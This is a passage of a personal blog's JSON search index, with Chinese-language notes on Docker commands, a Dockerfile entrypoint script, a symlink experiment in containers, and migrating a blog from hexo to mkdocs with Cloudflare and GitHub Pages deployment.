dhcp</p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/","title":"docker","text":"<p>\u8bb0\u5f55docker\u7684\u4f7f\u7528\uff0c\u5305\u542bdocker\u5e38\u7528\u547d\u4ee4\u548cDockerfile\u7684\u7f16\u5199\u3002\u76ee\u524d\u5df2\u7ecf\u6210\u529f\u4f7f\u7528dockerfile\u53d1\u5e03\u4e86\u7b2c\u4e00\u4e2a\u5e94\u7528<code>rzero/pal</code></p>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>ubuntu: Install Docker Engine on Ubuntu | Docker Docs</p>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#docker\u547d\u4ee4\u884c","title":"docker\u547d\u4ee4\u884c","text":"","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#container\u76f8\u5173","title":"container\u76f8\u5173","text":"<p>docker run - <code>-it</code>\uff1a\u4ea4\u4e92\u5f0f - <code>-d</code>\uff1a\u542f\u52a8\u540e\u8fdb\u5165\u540e\u53f0 - <code>--rm</code>\uff1a\u8fd0\u884c\u540e\u5220\u9664 - <code>--name</code> - <code>-p</code>\uff1a\u6620\u5c04\u7aef\u53e3\uff0c\u591a\u4e2a\u7aef\u53e3\u91cd\u590d\u591a\u6b21-p - <code>-v src:dst</code>\uff1abind mount</p> <p>\u5220\u9664\u5bb9\u5668\uff0c<code>-f</code>\u7528\u4e8e\u5220\u9664\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668 <pre><code>docker rm container\n</code></pre></p> <p>\u67e5\u770b\u5bb9\u5668\u8f93\u51fa, <code>-f</code>\u8ddf\u8e2a\u8f93\u51fa <pre><code>docker logs container -f\n</code></pre></p> <p>\u5bb9\u5668\u8fd0\u884c\u540e\uff0c\u8c8c\u4f3c\u4e0d\u80fd\u4fee\u6539\u6620\u5c04\u7aef\u53e3\u548c\u8def\u5f84\u3002\u53ef\u4ee5\u901a\u8fc7update\u4fee\u6539cpu\uff0c\u5185\u5b58\u7b49\u9650\u5236\u3002 \u66f4\u65b0\u5bb9\u5668restart policy <pre><code>docker update --restart unless-stopped redis\n</code></pre></p> <p>\u5176\u5b83 \u6307\u5b9a\u7528\u6237\u8fd0\u884c <pre><code>docker run --user &lt;username_or_UID&gt; &lt;image_name&gt;\n</code></pre> \u8986\u76d6Entrypoint <pre><code>docker run -it --rm --name test --entrypoint bash image\n</code></pre></p>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#images\u76f8\u5173","title":"images\u76f8\u5173","text":"<pre><code>docker images   # \u67e5\u770bimages\ndocker rmi      # \u5220\u9664\ndocker history &lt;image&gt;  # \u67e5\u770b\u955c\u50cf\u5386\u53f2\u8bb0\u5f55\uff08\u4e0d\u540clayer\uff09\n</code></pre> <p>\u91cd\u547d\u540dimage <pre><code>docker tag old_image_name:old_tag new_image_name:new_tag\ndocker rmi old_image_name:old_tag\n</code></pre></p>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#saveload-vs-exportimport-vs-commit","title":"save/load vs export/import vs commit","text":"<p>\u603b\u7ed3 - <code>docker save/load</code>\uff1a\u9002\u7528\u4e8e\u5907\u4efd\u548c\u8fc1\u79fb\u4e00\u4e2a\u6216\u591a\u4e2a\u955c\u50cf\uff0c\u5728\u4e0d\u540c\u7684Docker\u4e3b\u673a\u4e4b\u95f4\u4f20\u8f93\u3002 - <code>docker export/import</code>\uff1a \u9002\u7528\u4e8e\u5907\u4efd\u5bb9\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e0d\u5305\u62ec\u5b8c\u6574\u7684\u955c\u50cf\u5143\u6570\u636e\u548c\u5386\u53f2\u8bb0\u5f55\u3002 - <code>docker commit</code>\uff1a \u9002\u7528\u4e8e\u521b\u5efa\u57fa\u4e8e\u5bb9\u5668\u5f53\u524d\u72b6\u6001\u7684\u65b0\u955c\u50cf\uff0c\u5305\u542b\u65b0\u7684\u4e00\u5c42layer</p> <p>save/load</p> <p>\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u955c\u50cf\u6253\u5305\u6210 tar \u5f52\u6863\u6587\u4ef6\uff0c\u7528\u4e8e\u5907\u4efd\u548c\u4f20\u8f93\u955c\u50cf\u3002 \u8f93\u51fa <pre><code>docker save --output busybox.tar busybox  # \u8f93\u51fa\u5230tar\u6587\u4ef6\ndocker save -o ubuntu.tar ubuntu:lucid ubuntu:saucy  # \u9009\u62e9\u591a\u4e2atag\n\ndocker save myimage:latest | gzip &gt; myimage_latest.tar.gz # \u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\u5e76\u4f7f\u7528gzip\u538b\u7f29\n</code></pre></p> <p>\u5bfc\u5165 <pre><code>docker load --input=file.tar\n</code></pre></p> <p>export/import</p> <p>\u5c06\u5bb9\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\u5bfc\u51fa\u4e3a tar \u6587\u4ef6\uff0c\u4f46\u4e0d\u5305\u542b\u955c\u50cf\u7684\u5143\u6570\u636e\u548c\u5386\u53f2\u8bb0\u5f55\u3002 <pre><code>docker export -o container_filesystem.tar container_id\n\ndocker import container_filesystem.tar new_image_name:new_tag\n</code></pre></p> <p>commit</p> <p>\u5c06\u5bb9\u5668\u76ee\u524d\u7684\u66f4\u6539\u4fdd\u5b58\u4e3a\u65b0\u7684\u4e00\u4e2alayer\uff0c\u4ece\u800c\u57fa\u4e8e\u8be5\u65b0\u955c\u50cf\u521b\u5efa\u5176\u5b83\u5bb9\u5668 <pre><code>docker commit nginx_base hello_world_nginx   # \u4fdd\u5b58\u4e3ahello_world_nginx\u955c\u50cf\n\ndocker commit --author amit.sharma@sentinelone.com --message 'this is a basic nginx image' nginx_base authored # \u6dfb\u52a0author, message\u4fe1\u606f\n</code></pre></p> <p>\u53ef\u4ee5\u901a\u8fc7<code>--change</code>\u4fee\u6539\u539f\u672c\u5bb9\u5668\u7684\u4e00\u4e9b\u914d\u7f6e - CMD - ENTRYPOINT - ENV - EXPOSE - USER - VOLUME - WORKDIR <pre><code>docker commit --change='CMD [\"nginx\", \"-T\"]' nginx_base conf_dump\n</code></pre></p>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#dockerfile","title":"dockerfile","text":"<p>\u521b\u5efaDockerfile\uff0c\u7ecf\u5e38\u9047\u5230\u56e0\u4e3a\u67d0\u4e00\u6b65\u9519\u8bef\uff0c\u5bfc\u81f4\u53cd\u590ddocker build\u3002\u5176\u5b9e\u53ef\u4ee5\u5148\u521b\u5efa\u4e00\u4e2a\u57fa\u7840\u73af\u5883\uff0c\u7136\u540e\u8fdb\u5165\u73af\u5883\u914d\u7f6e\u4e00\u904d\uff0c\u6210\u529f\u540e\u518d\u5199dockerfile\u3002</p> <p>\u5148\u5982\u4e0b\u642d\u5efa\u4e00\u4e2a\u57fa\u7840\u73af\u5883 <pre><code>FROM ubuntu:22.04\n\nRUN apt update\\\n  &amp;&amp; apt install ...\\\n\nCOPY . /app \n</code></pre></p> <pre><code>docker build -t app .  # .\u8868\u793abuild\u65f6\u7684\u4e0a\u4e0b\u6587\uff0c\u5982\u679cDockerfile\u653e\u5728\u9879\u76ee\u6839\u76ee\u5f55\u7684\u8bdd\u3002COPY .\u4fbf\u8868\u793a\u5c06\u6574\u4e2a\u9879\u76ee\u590d\u5236\u5230\u5bb9\u5668\n</code></pre> <p>\u7136\u540e\u8fdb\u5165\u9879\u76ee\uff0c\u624b\u52a8\u5b89\u88c5\u5269\u4f59\u4f9d\u8d56\uff0c\u76f4\u5230\u6d4b\u8bd5\u80fd\u591f\u8fd0\u884c <pre><code>docker run -it --rm app bash\n</code></pre></p> <p>\u6700\u540e\u5b8c\u5584Dockerfile</p>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u4f7f\u7528entrypointsh\u811a\u672c","title":"\u4f7f\u7528entrypoint.sh\u811a\u672c","text":"<p>\u4f7f\u7528entrypoint\u811a\u672c\u53ef\u4ee5\u5b9e\u73b0\u6839\u636e\u7528\u6237\u8fd0\u884c\u5bb9\u5668\u65f6\u6307\u5b9a\u7684\u73af\u5883\u53d8\u91cf\uff0c\u8bbe\u7f6e\u7528\u6237uid,gid\uff0c\u4ece\u800c\u4fdd\u8bc1\u5bb9\u5668\u548chost\u6587\u4ef6\u6743\u9650\u6b63\u786e\u3002 <pre><code>ENTRYPOINT [ \"/parse-and-link/docker/entrypoint.sh\" ]\n</code></pre></p> <pre><code>#!/bin/bash\n\nPUID=${PUID:-1000}\nPGID=${PGID:-1000}\n\nif [ `id -u abc` -ne $PUID ]; then\n    usermod -u $PUID myuser\nfi\nif [ `id -g abc` -ne $PGID ]; then\n    groupmod -g $PGID abc\nfi\nchown -R abc:abc /parse-and-link\n\nif [ -n \"$JELLYFIN_URL\" ] &amp;&amp; [ -n \"$JELLYFIN_API_KEY\" ] ; then\n    echo \"Jellyfin URL is set to $JELLYFIN_URL\"\n    su abc -c \"python3 run_config.py -c /config.json -m -j $JELLYFIN_URL -k $JELLYFIN_API_KEY\"\nelse\n    su abc -c \"python3 run_config.py -c /config.json -m\"\nfi\n</code></pre>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u5176\u5b83\u5c0ftips","title":"\u5176\u5b83\u5c0ftips","text":"<p>\u6d4b\u8bd5\u7248\u547d\u4ee4 <pre><code>docker run -it --rm --name test --entrypoint bash rzero/pal:v1.0\n</code></pre></p> <p>\u53d1\u5e03\u7248\u547d\u4ee4 <pre><code>docker run -d --name pal --restart unless-stopped \\\n  -e JELLYFIN_URL=\"xxxxx\" \\\n  -e JELLYFIN_API_KEY=\"xxxxx\" \\\n  -v ./config/example.docker.json:/config.json \\\n  rzero/pal:v1.0\n</code></pre></p> <ul> <li>\u4f7f\u7528<code>.dockerignore</code>\u6587\u4ef6\uff0c\u5426\u5219\u6bcf\u6b21\u4fee\u6539Dockerfile\uff0cCOPY\u4e4b\u540e\u7684\u6b65\u9aa4\u5c31\u90fd\u4e0d\u80fd\u590d\u7528\u4e86</li> </ul>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u53d1\u5e03\u5230dockerhub","title":"\u53d1\u5e03\u5230dockerhub","text":"<pre><code>docker login\n\ndocker tag local_image:tag username/repository:tag\ndocker push username/repository:tag\n</code></pre>","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#docker\u5b9e\u9a8c","title":"docker\u5b9e\u9a8c","text":"","tags":["docker"]},{"location":"%E5%B7%A5%E5%85%B7/2024/01/08/docker/#\u8f6f\u786c\u94fe\u63a5","title":"\u8f6f\u786c\u94fe\u63a5","text":"<p>\u603b\u7ed3 - \u8f6f\u94fe\u63a5\u9700\u8981\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\uff0c\u5e76\u4e14src\u548cdst\uff08\u94fe\u63a5\uff09\u6700\u957f\u76f8\u540c\u8def\u5f84\u7684\u76ee\u5f55\uff0c\u5fc5\u987b\u540c\u65f6\u5b58\u5728\u4e8edocker\u548chost - \u786c\u94fe\u63a5\u6ca1\u6709\u4efb\u4f55\u8981\u6c42\uff0c\u6253\u4e0a\u94fe\u63a5\u7684\u4e00\u523b\uff0c\u4efb\u4f55\u5730\u65b9\u5747\u80fd\u8bbf\u95ee\u5230\u8be5\u6587\u4ef6</p> <p>\u5b9e\u9a8c\uff1a host:  <pre><code>\u279c  pwd\n/home/yfy/scripts/test/mnt\n\u279c  tree -L 4\n.\n\u251c\u2500\u2500 Disk1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 links\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 Movie\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 aa.mp4 -&gt; ../../Movie/a.mp4\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 a.mp4 -&gt; /home/yfy/scripts/test/mnt/Disk1/Movie/a.mp4\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 b.mp4   # \u786c\u94fe\u63a5\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Movie\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 a.mp4  # \u539f\u59cb\u6587\u4ef6\n\u251c\u2500\u2500 Disk2\n\u251c\u2500\u2500 outfile -&gt; ../../outfile  # \u8f6f\u94fe\u63a5\u5230docker\u4e2d\u770b\u4e0d\u5230\u7684\u76ee\u5f55\u6587\u4ef6\n\u2514\u2500\u2500 outfile-hl   # \u786c\u94fe\u63a5\n\n5 directories, 7 files\n</code></pre></p> <p>docker: <pre><code>ubuntu@dfc03804864c \u279c  pwd\n/workspace/mnt\nubuntu@dfc03804864c \u279c  tree -L 4\n.\n|-- Disk1\n|   |-- Movie\n|   |   `-- a.mp4\n|   `-- links\n|       `-- Movie\n|           |-- a.mp4 -&gt; /home/yfy/scripts/test/mnt/Disk1/Movie/a.mp4  (\u65e0\u6cd5\u8bbf\u95ee)\n|           |-- aa.mp4 -&gt; ../Movie/a.mp4  (\u65e0\u6cd5\u8bbf\u95ee)\n|           |-- aaa.mp4 -&gt; ../../Movie/a.mp4  \n|           `-- b.mp4\n|-- Disk2\n|-- outfile -&gt; ../../outfile   (\u65e0\u6cd5\u8bbf\u95ee)\n`-- outfile-hl  (\u65e0\u6cd5\u8bbf\u95ee)\n\n5 directories, 7 files\n</code></pre></p> <p>\u5728docker\u548chost\u4e2d\u67e5\u770boutfile-hl\u7684inode\u53ef\u4ee5\u770b\u5230\u548c\u6e90\u6587\u4ef6outfile\u662f\u76f8\u540c\u7684 <pre><code>\u279c  ls -i ../../outfile\n1091603 -rw-rw-r-- 2 yfy yfy 0 12\u6708  9 16:57 ../../outfile\n\n\u279c  ls -i outfile-hl\n1091603 -rw-rw-r-- 2 yfy yfy 0 12\u6708  9 16:57 outfile-hl\n</code></pre></p>","tags":["docker"]},{"location":"%E4%B8%AA%E4%BA%BA/2019/09/11/hello-world/","title":"\u5e8f\u7ae0","text":"<p>\u5199\u535a\u5ba2\u5728\u6211\u770b\u6765\u5c31\u72b9\u5982\u521b\u5efa\u4e00\u4e2a\u5c5e\u4e8e\u81ea\u5df1\u7684\u79d8\u5bc6\u57fa\u5730\uff0c \u90a3\u662f\u4e00\u4e2a\u5c5e\u4e8e\u81ea\u5df1\u5185\u5fc3\u7684\u573a\u6240\u3002</p> <p>\u5076\u5c14\u671f\u5f85\u7740\u6709\u4eba\u8bef\u5165\u8fd9\u91cc\uff0c \u901a\u8fc7\u6587\u5b57\u5411\u4ed6\u4eec\u8868\u8fbe\u771f\u5b9e\u7684\u81ea\u5df1\u3002</p>","tags":["\u5e8f\u7ae0"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/","title":"hexo\u8fc1\u79fb\u5230mkdoc","text":"<p>\u6211\u6bd4\u8f83\u559c\u6b22hexo\u7684tags\u5b57\u4e91\u7684\u6548\u679c\uff0c\u4e0d\u8fc7\u7531\u4e8e\u4ee5\u4e0b\u539f\u56e0\uff0c\u6211\u6253\u7b97\u8fc1\u79fb\u5230\u65b0\u7684\u9759\u6001\u535a\u5ba2\u6846\u67b6mkdocs material theme - hexo nodejs\u7684\u4f9d\u8d56\u5b9e\u5728\u662f\u592a\u9ebb\u70e6\u4e86 - hexo\u5c55\u793a\u7684\u4fe1\u606f\u91cf\u592a\u5c11\u4e86\uff08\u4e5f\u53ef\u80fd\u662f\u6211\u4f7f\u7528\u7684\u6a21\u677f\u7684\u95ee\u9898\uff09   - \u6211\u611f\u89c9\u8fd9\u4e00\u70b9\u4e0amkdoc\u6548\u679c\u5c31\u5f88\u597d\uff0c\u5728\u5927\u663e\u793a\u5668\u4e0a\u80fd\u591f\u663e\u793a\u66f4\u591a\u4fe1\u606f\uff0c\u67e5\u9605\u535a\u5ba2\u7684\u6548\u7387\u66f4\u9ad8</p> <p>TODO - [ ] \u96c6\u6210\u8bc4\u8bba\u533a:Adding a comment system - Material for MkDocs (squidfunk.github.io) - [ ] \u770b\u677f\u5a18</p> <p>\u53c2\u8003\u65b9\u6848 - \u6770\u54e5\u7684{\u8fd0\u7ef4\uff0c\u7f16\u7a0b\uff0c\u8c03\u677f\u5b50}\u5c0f\u7b14\u8bb0 (jia.je) - jiegec/blog-source: The source of my blog. (github.com) - \u30fe(^\u25bd^*)))\u6b22\u8fce\u56de\u6765~ (shaojiemike.top)</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#mkdocs\u6559\u7a0b","title":"mkdocs\u6559\u7a0b","text":"","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#install--run","title":"install &amp; run","text":"<p>\u5b89\u88c5mkdocs\u975e\u5e38\u7b80\u5355 <pre><code>pip install mkdocs-material\n</code></pre></p> <p>\u8fd0\u884c\u672c\u5730\u670d\u52a1\u5668 <pre><code>mkdocs serve -a 0.0.0.0:8000\n</code></pre></p> <p>\u751f\u6210\u9759\u6001\u9875\u9762\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5230<code>site/</code>\u76ee\u5f55 <pre><code>mkdocs build\n</code></pre></p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<p>\u53ea\u6709\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6mkdocs.yml <pre><code>mkdocs new .\n</code></pre></p> <pre><code>.\n\u251c\u2500 docs/\n\u2502  \u2514\u2500 index.md\n\u2514\u2500 mkdocs.yml\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#mkdocs-blog\u652f\u6301","title":"mkdocs blog\u652f\u6301","text":"<p>Setting up a blog - Material for MkDocs (squidfunk.github.io)</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#tags\u7d22\u5f15\u9875\u9762","title":"tags\u7d22\u5f15\u9875\u9762","text":"<p>category\u548carchive\u9875\u9762\u662f\u81ea\u52a8\u751f\u6210\u7684\uff0ctags\u9875\u9762\u9700\u8981\u624b\u52a8\u914d\u7f6e</p> <p>mkdocs automatically generating\u00a0archive\u00a0and\u00a0category\u00a0indexes,\u00a0post slugs, configurable\u00a0pagination\u00a0and more.</p> <p>\u60f3\u8981\u521b\u5efa\u4e00\u4e2a\u9875\u9762\u5305\u542b\u6240\u6709tag\u7d22\u5f15\uff0c\u9700\u8981\u521b\u5efa<code>docs/tags.md</code>\uff0c\u5185\u5bb9\u5982\u4e0b <pre><code># \u6807\u7b7e\n\n[TAGS]\n</code></pre></p> <p>mkdocs\u542f\u7528tags plugin <pre><code>plugins:\n  - tags:\n      # enabled: !ENV [DEPLOY, false]\n      enabled: true\n      tags_file: tags.md\n</code></pre></p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#excerpt","title":"excerpt","text":"<p>\u4f7f\u7528<code>&lt;!-- more --&gt;</code>\u5206\u9694\u535a\u5ba2 p.s \u4e2d\u95f4\u5fc5\u987b\u4fdd\u7559\u7a7a\u683c\uff0c\u4f7f\u7528<code>&lt;!--more--&gt;</code>\u65e0\u6cd5\u751f\u6548</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#authors","title":"authors","text":"<p>create the <code>.authors.yml</code>\u00a0file in your blog directory <pre><code>authors:\n  squidfunk:\n    name: Martin Donath\n    description: Creator\n    avatar: https://github.com/squidfunk.png\n</code></pre></p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u5728\u6587\u6863\u7684\u5143\u6570\u636e\u4e2d\u6dfb\u52a0author\u5217\u8868</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#linking","title":"linking","text":"<p>While\u00a0post URLs\u00a0are dynamically computed, the\u00a0built-in blog plugin\u00a0ensures that all links from and to posts and a post's assets are correct.</p> <p>\u6587\u6863\u4e2d\u94fe\u63a5\u5230\u53e6\u4e00\u4e2a\u6587\u6863 <pre><code>[Hello World!](blog/posts/hello-world.md)\n</code></pre></p> <p>\u94fe\u63a5\u5230\u4e00\u4e2a\u9875\u9762\uff0c\u53ea\u9700\u8981\u6307\u5411\u8be5\u9875\u9762\u7684\u7d22\u5f15md\u6587\u4ef6 <pre><code>[Blog](../index.md)\n</code></pre></p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#readtime","title":"readtime","text":"<p>\u663e\u793a\u6587\u7ae0\u7684\u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u3002\u81ea\u52a8\u542f\u7528\uff0c\u5982\u679c\u5acc\u4f30\u8ba1\u7684\u4e0d\u51c6\u786e\uff0c\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e <pre><code>---\ndate: 2023-01-31\nreadtime: 15\n---\n</code></pre></p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u6ca1\u6709category\u9875\u9762","title":"\u6ca1\u6709category\u9875\u9762","text":"<p>build\u540e\u624d\u4f1a\u751f\u6210\uff0c\u76f4\u63a5serve\u662f\u770b\u4e0d\u5230\u7684</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u6709\u7528\u7684plugin","title":"\u6709\u7528\u7684Plugin","text":"","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#meta","title":"meta","text":"<p>\u53ef\u4ee5\u4e3a\u4e00\u4e2a\u76ee\u5f55\u7684\u6240\u6709\u6587\u4ef6\u8bbe\u7f6e\u57fa\u7840meta\u4fe1\u606f\uff0c\u5728\u5206\u95e8\u522b\u7c7b\u5b58\u50a8\u535a\u5ba2\u65f6\u6bd4\u8f83\u6709\u7528\u3002\u4f46\u662f\u76ee\u524d\u662f\u9700\u8981\u4ed8\u8d39\u624d\u80fd\u4f7f\u7528 Sponsors only\u00a0\u2013 this plugin is currently reserved to\u00a0our awesome sponsors.</p> <p>Built-in meta plugin - Material for MkDocs (squidfunk.github.io) The meta plugin solves the problem of setting metadata (front matter) for all pages in a folder, i.e., a subsection of your project, which is particularly useful to ensure that a certain subset of pages features specific tags, uses a custom template, or is attributed to an author.</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#deploy","title":"Deploy","text":"","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#cloudfare-page","title":"cloudfare page","text":"<p>\u53c2\u8003\u8d44\u6599\uff1a - mkdocs+cf page\u8d44\u6599\uff1aDeploy MkDocs with Material or Material Insiders theme to Cloudflare Pages - Starfall Projects - cf page\u6587\u6863\uff1aGet started guide \u00b7 Cloudflare Pages docs - cloudflare build platform\u4ecb\u7ecd: Modernizing the toolbox for Cloudflare Pages builds</p> <p>cf page\u4f18\u52bf - cf page\u652f\u6301\u5f88\u591apreset\uff08\u5404\u79cd\u9759\u6001\u7f51\u7ad9\u6846\u67b6\uff09\uff0cmkdocs\u662f\u5176\u4e2d\u4e4b\u4e00\uff0c\u56e0\u6b64\u914d\u7f6e\u975e\u5e38\u7b80\u5355\u3002   - gh page\u53ea\u652f\u6301Jekyll\uff0c\u5176\u5b83\u9700\u8981\u81ea\u5b9a\u4e49workflow\u6765\u751f\u6210html\u9875\u9762 - \u652f\u6301\u8bbe\u7f6eProduction branch\u548cPreview branch\uff0c\u76d1\u542c\u4e0d\u540cgit\u5206\u652f - \u652f\u6301\u9009\u62e9\u4e0d\u540c\u7684build platform\uff0c\u76ee\u524d\u6709ubuntu22.04\u548cubuntu20.04</p> <p>\u6ce8\u610f\uff1a\u9700\u8981\u914d\u7f6e<code>requirements.txt</code>\u6587\u4ef6\u544a\u8bc9cf\u5b89\u88c5\u4f9d\u8d56\uff0c\u5426\u5219cf build\u65f6\u4f1a\u62a5\u9519<code>mkdocs not found</code> <pre><code>mkdocs-material\nmkdocs-material-extensions\nmkdocs-git-revision-date-localized-plugin\nmkdocs-wavedrom-plugin\nmkdocs-rss-plugin\n</code></pre></p> <p>\u914d\u7f6ecustom domain\u65f6\u76f4\u63a5\u6dfb\u52a0\u57df\u540d\u5373\u53ef</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#github-page","title":"github page","text":"<p>\u7531\u4e8e\u539f\u672c\u5df2\u7ecf\u521b\u5efa\u8fc7github page\u4e86\uff0c\u672c\u4ee5\u4e3a\u65e0\u6cd5\u518d\u521b\u5efa\u65b0\u7684github page\uff0c\u7136\u540e\u53d1\u73b0github\u652f\u6301\u591a\u79cdpage\uff01 - user, organization page\u662f\u8d26\u6237\u6027\u8d28\u7684page\uff0c\u5bf9\u5e94<code>&lt;username&gt;.github.io</code>\u6216<code>&lt;organization&gt;.github.io</code>\u7684\u4ed3\u5e93 - project page\u5219\u6ca1\u6709\u9650\u5236\uff0c\u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u591a\u4e2a\uff0c\u901a\u8fc7<code>http(s)://&lt;username&gt;.github.io/&lt;repository&gt;</code>\u8bbf\u95ee\u3002   - private\u4ed3\u5e93\u521b\u5efapublic page\u9700\u8981github pro\u4ee5\u4e0a</p> <p>\u53c2\u8003\u6587\u6863 - \u5173\u4e8egh page\u7c7b\u578b\uff0c\u9650\u5236\uff1aAbout GitHub Pages - GitHub Docs - \u914d\u7f6epublishing source\uff1aConfiguring a publishing source for your GitHub Pages site - GitHub Docs - mkdocs\u5173\u4e8edeploy\u6587\u6863\uff08github\u548cgitlab\uff09\uff1aPublishing your site - Material for MkDocs (squidfunk.github.io)</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u914d\u7f6epublishing-source","title":"\u914d\u7f6epublishing source","text":"<p>\u6709\u4e24\u79cd\u914d\u7f6epage source\u65b9\u6cd5 - deploy from a branch\uff1a\u901a\u5e38\u5bf9\u5e94\u4e00\u4e2agh-page\u5206\u652f\uff0c\u53ea\u5305\u542b\u9759\u6001html\u6587\u4ef6   - \u53ef\u4ee5\u662f\u672c\u5730\u4f7f\u7528\u7c7b\u4f3c<code>hexo deploy</code>, <code>mkdocs gh-deploy</code>\u547d\u4ee4\u751f\u6210\uff0c\u7136\u540epush\u5230github\u5206\u652f   - \u4e5f\u53ef\u4ee5\u662f\u81ea\u5b9a\u4e49gh workflow\uff0c\u751f\u6210\u7136\u540epush\u5230gh-page\u5206\u652f\u3002Most external CI workflows \"deploy\" to GitHub Pages by committing the build output to the\u00a0<code>gh-pages</code>\u00a0branch of the repository, and typically include a\u00a0<code>.nojekyll</code>\u00a0file. - github action   - \u4e5f\u662f\u5148\u901a\u8fc7action\u751f\u6210\u9759\u6001\u7f51\u7ad9\u6587\u4ef6\uff0c\u6700\u540e\u901a\u8fc7\u00a0<code>actions/upload-pages-artifact</code>\u00a0\u548c\u00a0<code>actions/deploy-pages</code>\u53d1\u5e03\u5230gh page\u3002</p> <p>mkdocs\u5b98\u65b9\u63d0\u4f9b\u7684\u65b9\u5f0f\u662f\u65b9\u5f0f1\uff0c\u4f7f\u7528\u5b83\u7684workflow\u811a\u672c\uff0c\u4f1a\u81ea\u52a8\u751f\u6210\u9759\u6001\u7f51\u7ad9\u6587\u4ef6\u5e76push\u5230gh-page\u5206\u652f\u3002 p.s 